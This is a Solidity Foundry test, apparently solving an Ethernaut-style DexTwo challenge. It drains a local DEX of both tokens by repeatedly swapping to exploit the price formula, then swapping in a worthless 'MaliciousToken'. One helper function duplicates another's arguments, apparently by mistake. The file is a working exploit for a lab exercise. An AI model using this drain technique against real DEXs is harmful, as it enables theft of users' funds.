// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {DexTwo, SwappableTokenTwo} from "../src/Swap2.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract DexTwoTest is Test {
    SwappableTokenTwo public swappabletokenA;
    SwappableTokenTwo public swappabletokenB;

    DexTwo public dexTwo;
    address attacker = makeAddr("attacker");

    ///DO NOT TOUCH!!!!
    function setUp() public {
        dexTwo = new DexTwo();
        swappabletokenA = new SwappableTokenTwo(address(dexTwo), "Swap", "SW", 110);
        vm.label(address(swappabletokenA), "Token 1");
        swappabletokenB = new SwappableTokenTwo(address(dexTwo), "Swap", "SW", 110);
        vm.label(address(swappabletokenB), "Token 2");
        dexTwo.setTokens(address(swappabletokenA), address(swappabletokenB));

        dexTwo.approve(address(dexTwo), 100);
        dexTwo.add_liquidity(address(swappabletokenA), 100);
        dexTwo.add_liquidity(address(swappabletokenB), 100);

        vm.label(attacker, "Attacker");

        IERC20(address(swappabletokenA)).transfer(attacker, 10);
        IERC20(address(swappabletokenB)).transfer(attacker, 10);
    }

    function test_swap2Token() public {
        console.log("\n===============BEFORE ATTACK======================\n");

        uint256 initialDexTwoBalA = swappabletokenA.balanceOf(address(dexTwo));
        uint256 initialDexTwoBalB = swappabletokenB.balanceOf(address(dexTwo));
        uint256 initialAttackerBalA = swappabletokenA.balanceOf(attacker);
        uint256 initialAttackerBalB = swappabletokenB.balanceOf(attacker);

        console.log("Initial DexTwo Token A Bal ", initialDexTwoBalA);
        console.log("Initial DexTwo Token B Bal ", initialDexTwoBalB);
        console.log("Initial Attacker Token A Bal ", initialAttackerBalA);
        console.log("Initial Attacker Token B Bal ", initialAttackerBalB);

        console.log("\n===============STARTING ATTACK...======================\n");

        vm.startPrank(attacker);

        dexTwo.approve(address(dexTwo), type(uint256).max);
        dexTwo.swap(address(swappabletokenA), address(swappabletokenB), 10);

        uint256 count;

        while (_dexTwoTokenABal() > _getSwapAmountFromBToA()) {
            console.log("Running round ", ++count, "...");
            if (_attackerTokenBBal() == 0) {
                break;
            }
            dexTwo.swap(address(swappabletokenB), address(swappabletokenA), swappabletokenB.balanceOf(attacker));

            if (_dexTwoTokenBBal() > _getSwapAmountFromAToB()) {
                dexTwo.swap(address(swappabletokenA), address(swappabletokenB), swappabletokenA.balanceOf(attacker));
            }
            console.log("Round ", count, " completed");
        }

        console.log("\nOut of the loop!!!\n");

        dexTwo.swap(address(swappabletokenB), address(swappabletokenA), swappabletokenB.balanceOf(address(dexTwo)));

        console.log("Deploying and using malicious token to drain left over...\n");

        MaliciousToken maliciousToken = new MaliciousToken(1000);
        maliciousToken.approve(address(dexTwo), type(uint256).max);
        maliciousToken.transfer(address(dexTwo), 100);
        dexTwo.swap(address(maliciousToken), address(swappabletokenB), maliciousToken.balanceOf(address(dexTwo)));

        uint256 AfterSwapDexTwoBalA = swappabletokenA.balanceOf(address(dexTwo));
        uint256 AfterSwapDexTwoBalB = swappabletokenB.balanceOf(address(dexTwo));

        console.log("DexTwo Token A Bal After Attack", AfterSwapDexTwoBalA);
        console.log("DexTwo Token B Bal After Attack", AfterSwapDexTwoBalB);
        console.log("Attacker Token A Bal After Attack", swappabletokenA.balanceOf(attacker));
        console.log("Attacker Token B Bal After Attack", swappabletokenB.balanceOf(attacker));

        console.log("\n===============END OF ATTACK======================\n");
        console.log("count", count);

        vm.stopPrank();

        assertEq(AfterSwapDexTwoBalA, 0);
        assertEq(AfterSwapDexTwoBalB, 0);
    }

    function _dexTwoTokenABal() internal view returns (uint256) {
        return swappabletokenA.balanceOf(address(dexTwo));
    }

    function _dexTwoTokenBBal() internal view returns (uint256) {
        return swappabletokenB.balanceOf(address(dexTwo));
    }

    function _attackerTokenBBal() internal view returns (uint256) {
        return swappabletokenB.balanceOf(attacker);
    }

    function _getSwapAmountFromBToA() internal view returns (uint256) {
        return dexTwo.getSwapAmount(
            address(swappabletokenB), address(swappabletokenA), swappabletokenB.balanceOf(attacker)
        );
    }

    function _getSwapAmountFromAToB() internal view returns (uint256) {
        return dexTwo.getSwapAmount(
            address(swappabletokenB), address(swappabletokenA), swappabletokenB.balanceOf(attacker)
        );
    }
}

contract MaliciousToken is ERC20 {
    constructor(uint256 initialSupply) ERC20("MaliciousToken", "MLT") {
        _mint(msg.sender, initialSupply);
    }
}
